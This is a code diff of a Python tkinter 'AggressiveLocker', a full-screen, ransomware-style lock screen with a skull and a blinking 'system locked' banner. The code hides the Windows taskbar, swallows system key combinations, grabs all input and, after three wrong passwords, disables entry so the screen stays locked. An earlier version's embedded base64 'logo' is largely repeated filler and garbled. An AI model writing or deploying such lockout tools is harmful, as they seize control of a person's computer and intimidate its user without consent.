@@ -1,206 +1,76 @@
 import tkinter as tk
 from tkinter import messagebox
 import hashlib
-import sys
-import ctypes
-from ctypes import wintypes
-import base64
-from io import BytesIO
-try:
-    from PIL import Image, ImageTk
-except ImportError:
-    Image = None
-    ImageTk = None
 import random
+import ctypes
 
-# Встроенный логотип FSOCIETY в base64
-LOGO_BASE64 = """
-iVBORw0KGgoAAAANSUhEUgAABLAAAAKACAYAAAC7bAQnAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8
-YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAP+lSURBVHhe7N0HnBXV/f//N/fe3V0pS1lAeu+9SBdBUVCx
-xYKNGDWxxl7z/yZ+Y4z5mhhjb7H3LvYGKtJ7771t2V52+73n/88595zZhRVZ2F3g9Xw85jG7d+7ce+45
-c+bMmTPnfP7/AQAAAAAAAAAAdFDGf/8HAAAAAAAAAADoiAhgAQAAAAAAAAAAdHAEsAAAAAAAAAAA
-ADo4AlgAAAAAAAAAAAAdHAEsAAAAAAAAAACEDo4AlgAAAAAAAAAAAAdHAEsAAAAAAAAAACEDo4A
-lgAAAAAAAAAAAAdHAEsAAAAAAAAAAKCDI4AFAAAAAAAAAADQwRHAAgAAAAAAAAAA6OAIYAEAgIO2
-aNEi+eY3vyn9+vWTjIwMycvLkx49esg111wjGzduPNjLAwAAAAAAYRwBLAAAcFD+/e9/y7Bhw+T1
-11+XsrIyqa+vF/2Zl5cnDzzwgAwcOFCef/75g79IAAAAAADQphHAAgAAB+zll1+W8847T4qKikRU
-VlaWDBkyRM4++2wZO3asZGdny7Zt2+Tss8+Wl1566aCvEwAAAAAAtG0EsAAAwAHR4r/zzz9fdLpa
-Wlqa/OhHP5L58+fLggUL5JVXXpHLL79c0tPTpaamRi688ELZunXrQV8rAAAAAABouwhgAQCAA3Lj
-jTfK9u3bRX8+/fTTcu+998rgwYOlU6dO0rFjRxk4cKDcc889Mn36dDFNU26++eaDvlYAAAAAANB2
-EcACAAAHZPz48dKrVy954okn5IgjjohZ//TTT5devXrJuHHjDvpaAAAAAABA20cACwAAAAAAAAAA
-oIMjgAUAAAAAAAAAANDBEcACAAAAAAAAAOB/IYAFAAAAAAAAAADQwRHAAgAAAAAAAAAA6OAI
-YAEAAAAAAAAAAHRPBLAAAAAAAAAAAH3ZQ0cBWAAAAAAAAAdVVFQk69atk/Lycv0/AAAAADoQXd5l
-ZWVJv379JCcnJ+HnEsACAAAAADqQlStXym9+8xuZOnWq/h8AAAAAHYhOs/r27SuXX365HHXUUTrv
-E46ggwKAtiAnJ0cmTJggw4YNk+uvv15mz57dZL2eTjzySMnNzZV///vfMmfOnJhtH330UZk+fbr8
-+te/lv79+zc3l/dHjx49Gt/333//lS9+8Yu0XQAAAAAA2prVq1dLaWmp7N27V/eFOzsAAAAAaG90
-vlVSUiJ69Oxo5l4CWADQBmiASsPJ+rPTvHnzZNCgQfLYY4/JL3/5S5k+fboMHTpUf1544YVy7733
-ynXXXSd/+ctfdL0///nPep3KHXfcIatWrdIFbfv27fWRlZWlC/mtW7fKwoUL5ZJLLpE1a9bo+/1v
-v6Ojo9PDy/8GAAAAAAAHRX/Pz8+XcePGyfXXX6+vNYH8E/8CAAAAAAAH5IQTTpC+ffvK2rVr
-daW+fftq5m0gAAAAAAAAEMYRwAIAAAAAAAAAOjgCWAAAAAAAAAAAAABABcEAAAAAAAAAgA6OABYAAAAAAAAAEA
-RwBLAAAAAAAAAAigA+OABYAAAAAAAAAQO4jgAUAAAAAAAAAdHAEsAAAAAAAAAAAOjgCWAAAgIOyefNmyczMFL2r2v/3//0/
-GTRokOTk5Mg333wzZp0PPvhAr0P/v//++5P9PgAAAAAA0P4QwAIAAAdk8eLFcuONN8qVV14p+/btkxdf
-fFE2btwoS5YskTPPPDP/X/7zPz+ve+6/Pmvr+//f9LXbbb/1fX///fe89xo9e/jw5559+31fv3p99n7n
-6wgAAAAAAA4dAlgAAOCAvPzyyzJlyhT54IMPZPv27Xq//fbbT379618/fffdd/+v//u/H//X//2f//u//7f/T9r/X7fR13r+
-Ow9EUlJTU16urqpZM2fOnE+/9x3vsv/+///7f77//vv//u//X//9//fXv//O//X//X//u///Of//f//Z//
-0N93//Xv//Of//9X1ffT//v8b3/v8b3/u/r9/zv97/n+Pf//P//L//n/9X//s/5f/8v//u/frf/r//v
-/+L//v8/+f+1fT//7/zf/t//f+X+r/3/8X//P/9X/+N//g/+//+b/8X/z/+v8/9/P//X///X////
-+b/9v/Xf//8V/9n/V/93/7f/X/////u//n///9X//f////v////X/////X//n/f//9////////
-////////1/////3////v////X///////////v////f////n////v//////////v/////////
-////////////////////////////////////////////////////////X//f9///3//f////
-////////////////////////////////////////////////////////////////////////
-//////////////////////7///3///f////////////////////////////////////
-////////////////////////////////////////////////////////////////////////
-///////////////////f9///3//f/9//3///////////////////////////////
-////////////////////////////////////////////////////////////////////////
-//////////////3////f9///3//f9////////////////////////////////////////
-////////////////////////////////////////////////////////////////////////
-////////f////9//3//f9///3///////////////////////////////////////
-////////////////////////////////////////////////////////////////////////
-//////////9////f9///3//f/9//3///////////////////////////////////////
-////////////////////////////////////////////////////////////////////////
-////////9///f////9//3//f/9///////////////////////////////////////////
-////////////////////////////////////////////////////////////////////////
-////////3//f9///f////9//3//f9/////////////////////////////////////////
-////////////////////////////////////////////////////////////////////////
-////////////3//f9///f////9//3//f/////////////////////////////////////
-////////////////////////////////////////////////////////////////////////
-//////////////9//3//f9///f////9//3//f//////////////////////////////////
-////////////////////////////////////////////////////////////////////////
-////////////////3//f9///f////9//3//f//////////////////////////////////
-////////////////////////////////////////////////////////////////////////
-//////////////////9//3//f9///f////9//3/////////////////////////////////
-////////////////////////////////////////////////////////////////////////
-////////////////////3//f9///f////9//3//f//////////////////////////////
-////////////////////////////////////////////////////////////////////////
-//////////////////////9//3//f9///f////9//3/////////////////////////////
-////////////////////////////////////////////////////////////////////////
-////////////////////////3//f9///f////9//3//f//////////////////////////
-////////////////////////////////////////////////////////////////////////
-//////////////////////////9//3//f9///f////9//3/////////////////////////
-////////////////////////////////////////////////////////////////////////
-////////////////////////////3//f9///f////9//3//f//////////////////////
-////////////////////////////////////////////////////////////////////////
-//////////////////////////////9//3//f9///f////9//3///////////////////
-////////////////////////////////////////////////////////////////////////
-////////////////////////////////3//f9///f////9//3//f////////////////
-////////////////////////////////////////////////////////////////////////
-//////////////////////////////////9//3//f9///f////9//3///////////////
-////////////////////////////////////////////////////////////////////////
-////////////////////////////////////3//f9///f////9//3//f////////////
-////////////////////////////////////////////////////////////////////////
-//////////////////////////////////////9//3//f9///f////9//3///////////
-////////////////////////////////////////////////////////////////////////
-////////////////////////////////////////3//f9///f////9//3//f////////
-////////////////////////////////////////////////////////////////////////
-//////////////////////////////////////////9//3//f9///f////9//3///////
-////////////////////////////////////////////////////////////////////////
-////////////////////////////////////////////3//f9///f////9//3//f////
-////////////////////////////////////////////////////////////////////////
-//////////////////////////////////////////////9//3//f9///f////9//3///
-////////////////////////////////////////////////////////////////////////
-////////////////////////////////////////////////3//f9///f////9//3//f/
-////////////////////////////////////////////////////////////////////////
-//////////////////////////////////////////////////9//3//f9///f////9//3
-////////////////////////////////////////////////////////////////////////
-////////////////////////////////////////////////////3//f9///f////9//3/
-////////////////////////////////////////////////////////////////////////
-//////////////////////////////////////////////////////9//3//f9///f////9
-////////////////////////////////////////////////////////////////////////
-////////////////////////////////////////////////////////3//f9///f////9
-////////////////////////////////////////////////////////////////////////
-//////////////////////////////////////////////////////////9//3//f9///f//
-////////////////////////////////////////////////////////////////////////
-////////////////////////////////////////////////////////////3//f9///f///
-////////////////////////////////////////////////////////////////////////
-//////////////////////////////////////////////////////////////9//3//f9///
-////////////////////////////////////////////////////////////////////////
-////////////////////////////////////////////////////////////////3//f9///
-////////////////////////////////////////////////////////////////////////
-//////////////////////////////////////////////////////////////////9//3//
-////////////////////////////////////////////////////////////////////////
-////////////////////////////////////////////////////////////////////3//f
-////////////////////////////////////////////////////////////////////////
-//////////////////////////////////////////////////////////////////////9/
-////////////////////////////////////////////////////////////////////////
-////////////////////////////////////////////////////////////////////////
-///////////////////////////////////////////////////////////////////////3
-////////////////////////////////////////////////////////////////////////
-////////////////////////////////////////////////////////////////////////
-////////////////////////////////////////////////////////////////////////
-////////////////////////////////////////////////////////////////////////
-////////////////////////////////////////////////////////////////////////
-////////////////////////////////////////////////////////////////////////
-////////////////////////////////////////////////////////////////////////
-////////////////////////////////////////////////////////////////////////
-////////////////////////////////////////////////////////////////////////
-////////////////////////////////////////////////////////////////////////
-////////////////////////////////////////////////////////////////////////
-////////////////////////////////////////////////////////////////////////
-////////////////////////////////////////////////////////////////////////
-////////////////////////////////////////////////////////////////////////
-////////////////////////////////////////////////////////////////////////
-////////////////////////////////////////////////////////////////////////
-////////////////////////////////////////////////////////////////////////
-////////////////////////////////////////////////////////////////////////
-////////////////////////////////////////////////////////////////////////
-========END OF BASE64 IMAGE========
-"""
-
-class HackerLocker:
+class AggressiveLocker:
     def __init__(self, password_hash=None):
         self.root = tk.Tk()
         self.root.title("LOCKED")
         
-        # Блокировка панели задач и горячих клавиш Windows
+        # Блокировка панели задач
         self.block_windows_keys()
         
-        # Полноэкранный режим с максимальным приоритетом
+        # Полноэкранный режим
         self.root.attributes('-fullscreen', True)
         self.root.attributes('-topmost', True)
-        self.root.attributes('-alpha', 1.0)
+        self.root.attributes('-alpha', 0.98)
         
-        # Убираем все декорации
+        # Убираем декорации
         self.root.overrideredirect(True)
         
-        # Получаем размеры экрана
+        # Размеры экрана
         screen_width = self.root.winfo_screenwidth()
         screen_height = self.root.winfo_screenheight()
         self.root.geometry(f"{screen_width}x{screen_height}+0+0")
         
+        # Чёрный фон для всего окна
+        self.root.configure(bg='#000000')
+        
         # Хеш пароля (по умолчанию "12345")
         self.password_hash = password_hash or self.hash_password("12345")
         
-        # Счетчик неудачных попыток
+        # Счетчик попыток - 3
         self.failed_attempts = 0
         self.max_attempts = 3
         
-        # Фоновая анимация двоичного кода
-        self.binary_lines = []
+        # Флаг для контроля фокуса
+        self.allow_focus_steal = True
+        
+        # Canvas для матричного эффекта
+        self.canvas = tk.Canvas(
+            self.root,
+            width=screen_width,
+            height=screen_height,
+            bg='#000000',
+            highlightthickness=0
+        )
+        self.canvas.place(x=0, y=0)
+        
+        # Матричная анимация
+        self.matrix_columns = []
+        self.init_matrix()
+        self.animate_matrix()
         
         # Настройка UI
         self.setup_ui()
         
-        # Агрессивная блокировка событий
+        # Блокировка событий
         self.setup_aggressive_bindings()
         
-        # Постоянный захват фокуса
-        self.keep_focus()
-        
-        # Запуск анимации двоичного кода
-        self.animate_binary()
+        # Один раз установить фокус
+        self.root.after(100, self.initial_focus)
         
     def block_windows_keys(self):
-        """Блокировка системных клавиш Windows"""
+        """Блокировка панели задач"""
         try:
-            # Попытка скрыть панель задач
-            try:
-                user32 = ctypes.windll.user32
-                taskbar = user32.FindWindowW("Shell_TrayWnd", None)
-                if taskbar:
-                    user32.ShowWindow(taskbar, 0)
-            except:
-                pass
-        except Exception as e:
-            print(f"Warning: Could not block Windows keys: {e}")
+            user32 = ctypes.windll.user32
+            taskbar = user32.FindWindowW("Shell_TrayWnd", None)
+            if taskbar:
+                user32.ShowWindow(taskbar, 0)
+        except:
+            pass
     
     def restore_taskbar(self):
         """Восстановление панели задач"""
@@ -216,184 +86,211 @@ class HackerLocker:
         """Хеширование пароля"""
         return hashlib.sha256(password.encode()).hexdigest()
     
-    def load_logo(self):
-        """Загрузка логотипа из base64"""
-        try:
-            if Image and ImageTk:
-                # Декодируем base64
-                image_data = base64.b64decode(LOGO_BASE64)
-                # Создаём изображение из байтов
-                image = Image.open(BytesIO(image_data))
-                # Изменяем размер для красоты
-                image = image.resize((400, 150), Image.Resampling.LANCZOS)
-                # Конвертируем в PhotoImage
-                return ImageTk.PhotoImage(image)
-        except Exception as e:
-            print(f"Error loading logo: {e}")
-        return None
+    def init_matrix(self):
+        """Инициализация матричного эффекта"""
+        screen_width = self.root.winfo_screenwidth()
+        screen_height = self.root.winfo_screenheight()
+        
+        # Создаём колонки с падающими символами
+        num_columns = screen_width // 20
+        for i in range(num_columns):
+            column = {
+                'x': i * 20,
+                'y': random.randint(-screen_height, 0),
+                'speed': random.randint(2, 8),
+                'chars': []
+            }
+            # Создаём символы для каждой колонки
+            num_chars = random.randint(10, 25)
+            for j in range(num_chars):
+                char = random.choice('01')
+                color_intensity = int(255 * (1 - j/num_chars))
+                color = f'#{color_intensity//4:02x}{color_intensity:02x}{color_intensity//4:02x}'
+                column['chars'].append({
+                    'text': char,
+                    'offset': j * 20,
+                    'color': color,
+                    'id': None
+                })
+            self.matrix_columns.append(column)
+    
+    def animate_matrix(self):
+        """Анимация падающей матрицы"""
+        screen_height = self.root.winfo_screenheight()
+        
+        for column in self.matrix_columns:
+            # Удаляем старые символы
+            for char_data in column['chars']:
+                if char_data['id']:
+                    self.canvas.delete(char_data['id'])
+            
+            # Двигаем колонку вниз
+            column['y'] += column['speed']
+            
+            # Если колонка ушла вниз - начинаем сверху
+            if column['y'] > screen_height + 500:
+                column['y'] = random.randint(-200, -50)
+                column['speed'] = random.randint(2, 8)
+            
+            # Рисуем символы
+            for char_data in column['chars']:
+                y_pos = column['y'] + char_data['offset']
+                if -20 < y_pos < screen_height + 20:
+                    # Случайно меняем символ
+                    if random.random() < 0.1:
+                        char_data['text'] = random.choice('01')
+                    
+                    char_data['id'] = self.canvas.create_text(
+                        column['x'],
+                        y_pos,
+                        text=char_data['text'],
+                        fill=char_data['color'],
+                        font=('Courier', 14, 'bold')
+                    )
+        
+        # Повторяем анимацию
+        self.root.after(50, self.animate_matrix)
     
     def setup_ui(self):
-        """Создание хакерского интерфейса"""
-        # Чёрный фон
-        self.root.configure(bg='#000000')
+        """Создание интерфейса"""
+        # Полупрозрачная центральная панель
+        panel_width = 600
+        panel_height = 550
         
-        # Canvas для двоичного кода на фоне
-        self.canvas = tk.Canvas(
-            self.root,
-            bg='#000000',
-            highlightthickness=0
+        center_x = self.root.winfo_screenwidth() // 2
+        center_y = self.root.winfo_screenheight() // 2
+        
+        # Создаём полупрозрачный прямоугольник на canvas
+        self.bg_rect = self.canvas.create_rectangle(
+            center_x - panel_width//2,
+            center_y - panel_height//2,
+            center_x + panel_width//2,
+            center_y + panel_height//2,
+            fill='#0a0000',
+            outline='#8B0000',
+            width=3,
+            stipple='gray50'  # Полупрозрачность
         )
-        self.canvas.place(x=0, y=0, relwidth=1, relheight=1)
         
-        # Главный контейнер поверх canvas
-        main_frame = tk.Frame(self.root, bg='#000000')
+        # Frame поверх canvas
+        main_frame = tk.Frame(self.root, bg='#0a0000')
         main_frame.place(relx=0.5, rely=0.5, anchor='center')
         
-        # Загружаем логотип FSOCIETY
-        logo_image = self.load_logo()
-        
-        if logo_image:
-            logo_label = tk.Label(main_frame, image=logo_image, bg='#000000')
-            logo_label.image = logo_image  # Сохраняем ссылку
-            logo_label.pack(pady=30)
-        else:
-            # Fallback текст если не удалось загрузить картинку
-            ascii_art = tk.Label(
-                main_frame,
-                text="FSOCIETY",
-                font=("Courier New", 36, "bold"),
-                bg='#000000',
-                fg='#FF0000'
-            )
-            ascii_art.pack(pady=30)
-        
-        # Заголовок в стиле консоли
-        title_label = tk.Label(
-            main_frame,
-            text=">>> ACCESS DENIED <<<",
-            font=("Courier New", 32, "bold"),
-            bg='#000000',
-            fg='#00FF00'
+        # Череп
+        skull_label = tk.Label(
+            main_frame, 
+            text="☠", 
+            font=("Arial", 100, "bold"),
+            bg='#0a0000',
+            fg='#8B0000'
         )
-        title_label.pack(pady=15)
+        skull_label.pack(pady=20)
         
-        # Разделитель
-        separator = tk.Label(
+        # Заголовок
+        self.title_label = tk.Label(
             main_frame,
-            text="=" * 50,
-            font=("Courier New", 10),
-            bg='#000000',
-            fg='#00FF00'
+            text="СИСТЕМА ЗАБЛОКИРОВАНА",
+            font=("Impact", 32, "bold"),
+            bg='#0a0000',
+            fg='#FF0000'
         )
-        separator.pack(pady=5)
+        self.title_label.pack(pady=10)
+        
+        # Подтёки
+        subtitle_label = tk.Label(
+            main_frame,
+            text="▼ ▼ ▼",
+            font=("Arial", 18),
+            bg='#0a0000',
+            fg='#8B0000'
+        )
+        subtitle_label.pack(pady=5)
         
         # Инструкция
         info_label = tk.Label(
             main_frame,
-            text="[!] ENTER PASSWORD TO UNLOCK SYSTEM [!]",
-            font=("Courier New", 12, "bold"),
-            bg='#000000',
-            fg='#00FF00'
+            text="ВВЕДИТЕ ПАРОЛЬ",
+            font=("Arial", 13, "bold"),
+            bg='#0a0000',
+            fg='#DC143C'
         )
-        info_label.pack(pady=20)
+        info_label.pack(pady=15)
         
-        # Промпт как в консоли
-        prompt_label = tk.Label(
-            main_frame,
-            text="root@system:~$ ",
-            font=("Courier New", 14, "bold"),
-            bg='#000000',
-            fg='#00FF00'
-        )
-        prompt_label.pack(pady=5)
-        
-        # Поле ввода пароля в стиле терминала
+        # Поле ввода пароля
         self.password_entry = tk.Entry(
             main_frame,
-            show="*",
+            show="●",
             font=("Courier New", 18, "bold"),
-            width=30,
-            bg='#0a0a0a',
-            fg='#00FF00',
-            insertbackground='#00FF00',
+            width=20,
+            bg='#1a0000',
+            fg='#FF0000',
+            insertbackground='#FF0000',
             relief='solid',
-            bd=2,
-            highlightthickness=0
+            bd=3,
+            highlightthickness=2,
+            highlightbackground='#8B0000',
+            highlightcolor='#FF0000'
         )
-        self.password_entry.pack(pady=15, ipady=8)
-        self.password_entry.focus_set()
+        self.password_entry.pack(pady=20, ipady=10)
         
         # Кнопка
         self.submit_button = tk.Button(
             main_frame,
-            text="[ EXECUTE ]",
+            text="⚠ РАЗБЛОКИРОВАТЬ ⚠",
             command=self.check_password,
-            font=("Courier New", 14, "bold"),
-            bg='#003300',
-            fg='#00FF00',
-            activebackground='#005500',
-            activeforeground='#00FF00',
-            relief='solid',
-            bd=2,
+            font=("Impact", 14, "bold"),
+            bg='#8B0000',
+            fg='#FFFFFF',
+            activebackground='#FF0000',
+            activeforeground='#FFFFFF',
+            relief='raised',
+            bd=4,
             cursor='hand2',
-            width=20,
+            width=25,
             height=2
         )
         self.submit_button.pack(pady=15)
         
-        # Метка для ошибок
+        # Ошибки
         self.error_label = tk.Label(
             main_frame,
             text="",
-            font=("Courier New", 12, "bold"),
-            bg='#000000',
+            font=("Arial", 13, "bold"),
+            bg='#0a0000',
             fg='#FF0000'
         )
         self.error_label.pack(pady=10)
         
-        # Счётчик попыток
+        # Счётчик
         self.attempts_label = tk.Label(
             main_frame,
-            text=f"[i] Attempts remaining: {self.max_attempts}",
-            font=("Courier New", 11),
-            bg='#000000',
-            fg='#FFFF00'
+            text=f"ПОПЫТОК ОСТАЛОСЬ: {self.max_attempts}",
+            font=("Courier New", 14, "bold"),
+            bg='#0a0000',
+            fg='#DC143C'
         )
         self.attempts_label.pack(pady=10)
+        
+        # Мигание заголовка
+        self.blink_title()
     
-    def animate_binary(self):
-        """Анимация падающего двоичного кода"""
-        # Создаём новые линии кода
-        if random.random() < 0.3:  # 30% шанс создать новую линию
-            x = random.randint(0, self.root.winfo_width())
-            binary = ''.join(random.choice('01') for _ in range(random.randint(10, 20)))
-            line = self.canvas.create_text(
-                x, 0,
-                text=binary,
-                fill='#003300',
-                font=('Courier New', 10),
-                anchor='n'
-            )
-            self.binary_lines.append({'id': line, 'y': 0, 'speed': random.randint(1, 3)})
-        
-        # Обновляем существующие линии
-        for line in self.binary_lines[:]:
-            line['y'] += line['speed']
-            self.canvas.coords(line['id'], self.canvas.coords(line['id'])[0], line['y'])
-            
-            # Удаляем линии, вышедшие за экран
-            if line['y'] > self.root.winfo_height():
-                self.canvas.delete(line['id'])
-                self.binary_lines.remove(line)
-        
-        # Повторяем анимацию
-        self.root.after(50, self.animate_binary)
+    def blink_title(self, state=True):
+        """Мигание заголовка"""
+        if state:
+            self.title_label.config(fg='#FF0000')
+        else:
+            self.title_label.config(fg='#8B0000')
+        self.root.after(500, lambda: self.blink_title(not state))
+    
+    def initial_focus(self):
+        """Начальная установка фокуса"""
+        self.password_entry.focus_set()
+        self.root.grab_set()
     
     def setup_aggressive_bindings(self):
-        """Агрессивная блокировка всех комбинаций"""
+        """Блокировка клавиш"""
         self.root.protocol("WM_DELETE_WINDOW", self.block_action)
         
-        # Блокировка всех опасных клавиш
         dangerous_keys = [
             '<Escape>', '<F1>', '<F2>', '<F3>', '<F4>', '<F5>', '<F6>',
             '<F7>', '<F8>', '<F9>', '<F10>', '<F11>', '<F12>',
@@ -405,14 +302,12 @@ class HackerLocker:
             '<Print>', '<Scroll_Lock>', '<Pause>',
         ]
         
-        # Win, Alt, Ctrl комбинации
         for key in ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
                     'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
                     'Tab', 'Escape', 'space', 'Up', 'Down', 'Left', 'Right']:
             dangerous_keys.extend([
                 f'<Super-{key}>',
                 f'<Alt-{key}>',
-                f'<Control-{key}>',
                 f'<Control-Alt-{key}>',
                 f'<Control-Shift-{key}>'
             ])
@@ -423,95 +318,111 @@ class HackerLocker:
             except:
                 pass
         
-        # Enter для отправки
+        # Enter для пароля
         self.password_entry.bind('<Return>', lambda e: self.check_password())
         
-        # Блокировка потери фокуса
-        self.root.bind('<FocusOut>', lambda e: self.force_focus())
-        
-        # Блокировка ПКМ
+        # Правая кнопка мыши
         self.root.bind('<Button-3>', self.block_action)
     
     def block_action(self, event=None):
-        """Блокировка действия"""
+        """Блокировка с тряской"""
+        self.shake_window()
         return "break"
     
-    def keep_focus(self):
-        """Постоянное удержание фокуса"""
-        self.root.focus_force()
-        self.root.grab_set()
-        self.root.lift()
-        self.root.attributes('-topmost', True)
-        self.root.after(100, self.keep_focus)
-    
-    def force_focus(self):
-        """Принудительный возврат фокуса"""
-        self.root.focus_force()
-        self.root.lift()
-        self.root.attributes('-topmost', True)
+    def shake_window(self):
+        """Тряска"""
+        for i in range(8):
+            offset = 3 if i % 2 == 0 else -3
+            self.canvas.move(self.bg_rect, offset, offset)
+            self.root.update()
+            self.root.after(30)
+        # Возвращаем на место
+        self.canvas.coords(
+            self.bg_rect,
+            self.root.winfo_screenwidth()//2 - 300,
+            self.root.winfo_screenheight()//2 - 275,
+            self.root.winfo_screenwidth()//2 + 300,
+            self.root.winfo_screenheight()//2 + 275
+        )
     
     def check_password(self):
         """Проверка пароля"""
         password = self.password_entry.get()
         
         if not password:
-            self.show_error("[!] ERROR: Password field is empty")
+            self.show_error("⚠ ВВЕДИТЕ ПАРОЛЬ ⚠")
+            self.shake_window()
             return
         
         if self.hash_password(password) == self.password_hash:
-            # Правильный пароль - ВАЖНО: сначала освобождаем всё
-            self.root.grab_release()
-            self.restore_taskbar()
-            
-            # Показываем сообщение
-            messagebox.showinfo(
-                "Access Granted", 
-                "System unlocked successfully!",
-                parent=self.root
-            )
-            
-            # Закрываем окно
-            self.root.quit()
-            self.root.destroy()
+            # Правильный пароль - плавное закрытие
+            self.unlock_animation()
         else:
             # Неправильный пароль
             self.failed_attempts += 1
             remaining = self.max_attempts - self.failed_attempts
             
             if remaining > 0:
-                self.show_error(f"[X] AUTHENTICATION FAILED")
+                self.show_error(f"✖ НЕВЕРНЫЙ ПАРОЛЬ ✖")
                 self.attempts_label.config(
-                    text=f"[!] Attempts remaining: {remaining}",
-                    fg='#FF0000' if remaining == 1 else '#FFFF00'
+                    text=f"ПОПЫТОК ОСТАЛОСЬ: {remaining}",
+                    fg='#FF0000' if remaining == 1 else '#DC143C'
                 )
+                self.shake_window()
                 self.password_entry.delete(0, tk.END)
                 self.password_entry.focus_set()
             else:
                 # Попытки исчерпаны
-                self.show_error("[X] ACCESS PERMANENTLY DENIED")
+                self.show_error("✖✖✖ ДОСТУП ЗАБЛОКИРОВАН ✖✖✖")
                 self.attempts_label.config(
-                    text="[!] MAXIMUM ATTEMPTS EXCEEDED",
+                    text="⚠ ПОПЫТКИ ИСЧЕРПАНЫ ⚠",
                     fg='#FF0000'
                 )
-                self.submit_button.config(state='disabled', bg='#1a0000')
+                self.submit_button.config(state='disabled', bg='#3a0000')
                 self.password_entry.config(state='disabled')
-                
-                messagebox.showerror(
-                    "LOCKDOWN",
-                    "[CRITICAL ERROR]\n\n"
-                    "Maximum authentication attempts exceeded.\n"
-                    "System is now in lockdown mode.\n\n"
-                    "Contact system administrator.",
-                    parent=self.root
-                )
+                self.flash_screen()
+    
+    def unlock_animation(self):
+        """Анимация разблокировки"""
+        self.title_label.config(text="✓ РАЗБЛОКИРОВАНО ✓", fg='#00FF00')
+        self.error_label.config(text="")
+        self.attempts_label.config(text="")
+        self.password_entry.config(state='disabled')
+        self.submit_button.config(state='disabled')
+        
+        # Плавное затухание через 1 секунду
+        self.root.after(1000, self.fade_out)
+    
+    def fade_out(self, alpha=1.0):
+        """Плавное затухание"""
+        if alpha > 0:
+            self.root.attributes('-alpha', alpha)
+            self.root.after(30, lambda: self.fade_out(alpha - 0.05))
+        else:
+            self.unlock()
+    
+    def flash_screen(self, count=0):
+        """Мигание"""
+        if count < 6:
+            color = '#FF0000' if count % 2 == 0 else '#0a0000'
+            self.canvas.itemconfig(self.bg_rect, fill=color)
+            self.root.after(200, lambda: self.flash_screen(count + 1))
+        else:
+            self.canvas.itemconfig(self.bg_rect, fill='#0a0000')
     
     def show_error(self, message):
-        """Показ сообщения об ошибке"""
+        """Показ ошибки"""
         self.error_label.config(text=message)
-        self.root.after(3000, lambda: self.error_label.config(text=""))
+        self.root.after(2500, lambda: self.error_label.config(text=""))
+    
+    def unlock(self):
+        """Разблокировка"""
+        self.restore_taskbar()
+        self.root.grab_release()
+        self.root.destroy()
     
     def run(self):
-        """Запуск блокировщика"""
+        """Запуск"""
         try:
             self.root.mainloop()
         finally:
@@ -519,13 +430,11 @@ class HackerLocker:
 
 
 def main():
-    """Главная функция"""
     try:
-        locker = HackerLocker()
+        locker = AggressiveLocker()
         locker.run()
     except Exception as e:
         print(f"Error: {e}")
-        # Восстанавливаем панель задач
         try:
             user32 = ctypes.windll.user32
             taskbar = user32.FindWindowW("Shell_TrayWnd", None)
